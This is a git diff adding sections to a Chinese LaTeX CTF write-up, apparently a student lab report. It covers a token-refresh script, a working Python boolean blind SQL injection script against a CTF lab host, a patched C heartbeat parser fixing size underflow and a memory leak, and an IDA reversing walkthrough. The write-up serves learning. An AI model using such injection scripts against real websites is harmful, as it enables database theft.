@@ -143,6 +143,180 @@ s.close()
         \includegraphics[width=0.8\textwidth]{./figure/solved.png}
         \caption{solved}
      \end{figure} 
+\section*{Web}
+\subsection*{Challege 1}
+\paragraph*{token}：本题需要在网页上输入token，然后才能得到flag，每次刷新页面，token都会发生变化，所以需要模拟一个用户，进行1337次操作，经过学长的讲解，解决代码如下
+\begin{minted}{python}
+    import requests
+    import re
+
+    sess = requests.Session()
+
+    for i in range(1337):
+        res = sess.get("http://pumpk1n.com/lab0.php")
+        r = re.findall(r"token=(.*)'", res.text)
+        flag = sess.get(f"http://pumpk1n.com/flag.php?token={r[0]}")
+        if i == 1336:
+            print(flag.text)
+\end{minted}   
+     最终得到flag为\textcolor{red}{ flag\{56297ad00e70449a16700a77bf24b071\}}
+   \par 
+     \mintinline{python}|request|库是python中用来编写爬虫程序的一个常用库，代码中的\texttt{get}用于表示向网站发起请求，获取页面响应对象，\texttt{Session}用于保持会话，\texttt{re}库用于正则表达式匹配，\texttt{findall}用于查找所有符合条件的字符串
+\subsection*{Challege 2}
+   \paragraph*{本题为布尔盲注}:学长的讲解中告诉我们可以通过输入\\
+   \texttt{if(ascii(substr((select(flag)from(flag)),{0},1))={1},1,2)}来判断给出的字符是否正确，正确为1，错误为2，但是回到宿舍开始操作的时候发现好像并没有这么简单，首先我就不知道flag有多长，后面查询了uuid的结构，可以知道flag有多长了，但是每个uuid是什么又需要遍历，这就打消了我手动的念头，于是我在网上搜索python怎么跟网页交互，
+   发现了\texttt{requests}库中的\texttt{post}函数可以实现这一功能。然后再通过\texttt{view-source}知道了应该传递的参数为id,为了遍历字符，我使用了\texttt{string}库中的\texttt{printable}：
+   \begin{figure}[H]
+         \centering
+         \includegraphics[width=0.8\textwidth]{./figure/web2.png}
+         \caption{web2}
+    \end{figure}
+    最终代码如下
+    \begin{minted}{python}
+    import requests
+    import string
+
+    flag = ''
+    url = 'http://85b36b6c-c28f-4ae1-b573-634002afb14a.node5.buuoj.cn:81/'
+    ascii_list = string.printable
+    done = 0
+    index = 10
+
+    while done != 1:
+        for i in ascii_list:
+            input = 'if(ascii(substr((select(flag)from(flag)),{0},1))={1},1,2)'.format(index, ord(i))
+            post_in = {"id": input}
+            res = requests.post(url=url, data=post_in)
+            
+            if 'glzjin' in res.text:
+                flag += i
+                print(flag)
+                index += 1
+                
+                if i == '}':
+                    done = 1
+                break
+    \end{minted}
+    最终得到flag为\textcolor{red}{flag\{0304dcdb\mbox{-}6bd1\mbox{-}4ed0\mbox{-}9fba\mbox{-}b2fbd68ea8c7\}}
+
+\section*{Pwn}
+    \paragraph*{}本题为找bug，在于program.elf交互的过程中，验证了两个可能出现的错误，一个是无符号size溢出，一个是结构体里面的size没有及时更新,有可能会比real_size更大，导致可能的内存泄漏，还有一个是main函数里面申请的内存没有及时释放。修复后的代码如下
+    \begin{minted}{c}
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <stdint.h>
+#include <stdbool.h>
+
+struct hbpkt
+{
+    uint32_t size;
+    uint32_t timestamp;
+    uint32_t index;
+    uint32_t cred;
+    char data[];
+};
+
+struct hbpkt *get_heart_beat()
+{
+    uint8_t buffer[0x1000] = {0};
+    fread(buffer, sizeof(struct hbpkt), 1, stdin);
+
+    struct hbpkt *tmp = (struct hbpkt *)buffer;
+
+    if (tmp->size > 0x1000)
+        return NULL;
+    
+    if(tmp->size > sizeof(struct hbpkt))fread(tmp->data, tmp->size - sizeof(struct hbpkt), 1, stdin);
+    else {
+        printf("Invalid size\n");
+        return NULL;
+    }//增加判断，防止 size 小于等于 sizeof(struct hbpkt) 时无符号数溢出
+
+    uint32_t real_size = sizeof(struct hbpkt) + strlen(tmp->data);
+
+    struct hbpkt *res = malloc(real_size);
+
+    if (!res)
+        return NULL;
+
+    memcpy(res, buffer, real_size);
+
+    res->index += 1;
+    res->size = real_size;//更新size，防止溢出
+
+    return res;
+}
+
+int reply_heart_beat(struct hbpkt *pkt)
+{
+    int err=0;
+    int written;
+
+    if (pkt->size)
+    {
+        written = fwrite(pkt, 1, pkt->size, stdout);
+        fflush(stdout);
+    }
+
+    if (written == 0 || written != pkt->size)
+    {
+        err = 1;
+    }
+
+    return err;
+}
+
+int main()
+{
+    int err;
+    while (true)
+    {
+        struct hbpkt *p = get_heart_beat();
+        if (!p)
+            continue;
+
+        err = reply_heart_beat(p);
+
+        if (err)
+        {
+            free(p);
+            continue;
+        }
+        free(p);//释放内存
+    }
+}
+    \end{minted} 
+
+可以使用命令\mintinline{C}|valgrind --log-file=log.txt --leak-check=full --show-leak-kinds=all ./program.elf < pkt1|来检测存在的错误，会把结果输出到log文件中
+
+\section*{reverse}
+\begin{itemize}
+    \item 首先下载IDA应用程序，然后打开该elf文件，右边应该是汇编代码,左边应该是函数，下面应该是反汇编过程中的信息
+    \begin{figure}[H]
+        \centering
+        \includegraphics[width=0.8\textwidth]{./figure/reverse.png}
+        \caption{reverse}
+    \end{figure}
+    \item F5快捷键可以快速反汇编,这样我们就得到了伪代码：
+    \begin{figure}[H]
+        \centering
+        \includegraphics[width=0.8\textwidth]{./figure/reverse2.png}
+        \caption{reverse2}
+    \end{figure}
+    \item 观察伪代码：该代码将输入的password的ascii码乘以16然后与table里面的数比较，那么只要反过来将table里面的数除以16就可以得到密码了
+    \begin{figure}[H]
+        \centering
+        \includegraphics[width=0.8\textwidth]{./figure/solution.png}
+        \caption{solution}
+    \end{figure}
+    \begin{figure}[H]
+        \centering
+        \includegraphics[width=0.8\textwidth]{./figure/success.png}
+        \caption{success}
+    \end{figure}
+\end{itemize}    
+
 \section*{Misc}
 \subsection*{Challege 1}
 \paragraph*{解码}：根据提示，使用CyberChef工具，把神奇妙妙工具 \texttt{Magic},拉到Recipe中，output中得到flag，同时也得到解码顺序为
@@ -162,7 +336,7 @@ $$ BASE85 \quad BASE32 \quad BASE64 $$
     \includegraphics[width=0.6\textwidth]{./figure/misc_challenge2.png}
     \caption{flag}
 \end{figure}
-\paragraph*{}根据提示，第一部分使用了LGB隐写，网上搜索了LGB隐写的方式之后，首先使用binwalk查看图片，发现只有一个JPG文件，然后下载配置完stegsolve之后使用stegsolve查看,根据LGB隐写的原理，从原图改变为\texttt{Red plane 0}之后，发现有明显的变化，得到第一部分flag
+\paragraph*{}根据提示，第一部分使用了LSB隐写，网上搜索了LSB隐写的方式之后，首先使用binwalk查看图片，发现只有一个JPG文件，然后下载配置完stegsolve之后使用stegsolve查看,根据LGB隐写的原理，从原图改变为\texttt{Red plane 0}之后，发现有明显的变化，得到第一部分flag
 \begin{figure}[H]
     \centering
     \includegraphics[width=0.6\textwidth]{./figure/Part1.png}
